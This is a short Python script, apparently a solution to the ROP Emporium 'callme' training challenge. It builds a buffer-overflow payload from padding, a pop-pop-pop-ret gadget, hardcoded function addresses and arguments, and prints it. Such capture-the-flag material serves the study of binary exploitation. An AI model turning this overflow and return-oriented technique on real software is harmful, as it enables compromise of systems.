import struct

payload = ""

callmeone = 0x080485c0
callmetwo = 0x08048620
callmethree = 0x080485b0
exit = 0x080485e0

popsret = 0x080488a9

payload += "A"*44
payload += struct.pack("I", callmeone)
payload += struct.pack("I", popsret)
payload += struct.pack("I", 0x00000001)
payload += struct.pack("I", 0x00000002)
payload += struct.pack("I", 0x00000003)

payload += struct.pack("I", callmetwo)
payload += struct.pack("I", popsret)
payload += struct.pack("I", 0x00000001)
payload += struct.pack("I", 0x00000002)
payload += struct.pack("I", 0x00000003)

payload += struct.pack("I", callmethree)
payload += struct.pack("I", exit)
payload += struct.pack("I", 0x00000001)
payload += struct.pack("I", 0x00000002)
payload += struct.pack("I", 0x00000003)
payload += struct.pack("I", exit)
print(payload)
